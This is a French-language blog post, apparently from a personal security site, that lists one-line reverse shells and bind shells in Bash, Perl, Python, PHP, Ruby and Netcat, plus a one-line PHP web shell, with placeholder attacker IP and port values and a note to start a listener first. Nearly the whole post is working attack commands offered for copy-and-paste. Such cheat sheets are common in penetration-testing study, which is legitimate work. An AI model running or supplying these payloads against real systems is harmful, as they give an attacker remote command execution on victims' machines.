---
layout: post
title: Oneliner shell - Cheat sheet
subtitle: Simple shells & Reverse shells
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [Shell, Reverse shell, Cheat sheet, Python, PHP, Bash, Perl, Ruby, Netcat]
comments: false
---

**Créer un shell ou un reverse shell en une ligne de code, c'est faisable. Voici quelques possibilités.**

Remarque: pour les reverse shell commencer par lancer un listener du côté de la machine de l'attaquant:

~~~
nc -nlvp <PORT>
~~~

# Bash

## Reverse shell 

~~~
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
~~~

~~~
exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done
~~~

~~~
exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
~~~

~~~
0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
~~~

# Perl

## Reverse shell

Version dépendante de « /bin/sh » :

~~~
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
~~~

Version indépendante de « /bin/sh » pour Linux (avec fork) :

~~~
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
~~~

Si le système cible est un Windows (sans fork) :

~~~
perl -MIO -e "$c=new IO::Socket::INET(PeerAddr,'<IP>:<PORT>');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"
~~~

# Python 

## Reverse shell

~~~
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
~~~

# PHP

## Web shell

~~~
<?php system($_GET['cmd']);?>
~~~

## Reverse shell

~~~
php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
~~~

~~~ 
php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
~~~

~~~ 
php -r '$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'
~~~

~~~ 
php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
~~~

~~~ 
php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
~~~

# Ruby

## Reverse shell 

One-line dépendante de « /bin/sh » :

~~~
ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
~~~

Version indépendante de « /bin/sh » pour Linux (avec fork) :

~~~
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
~~~

Version pour Windows (sans fork) :

~~~
ruby -rsocket -e "c=TCPSocket.new('<IP>','<PORT>');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
~~~

# Netcat

## Bind shell

~~~
#Linux
nc -vlp 5555 -e /bin/bash
nc 192.168.1.101 5555

# Windows
nc.exe -nlvp 4444 -e cmd.exe
~~~

## Reverse shell

~~~
# Linux
nc -lvp 5555
nc 192.168.1.101 5555 -e /bin/bash

# Windows
nc -lvp 443
nc.exe 192.168.1.101 443 -e cmd.exe
~~~

Références:

- Acunetix, Web shells 101, [https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/)
- Asafety, Reverse-shell one-liner Cheat Sheet, [https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/)
- Reverse shells, [https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html](https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html)
- Reverse shells, [https://alamot.github.io/reverse_shells/](https://alamot.github.io/reverse_shells/)


[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

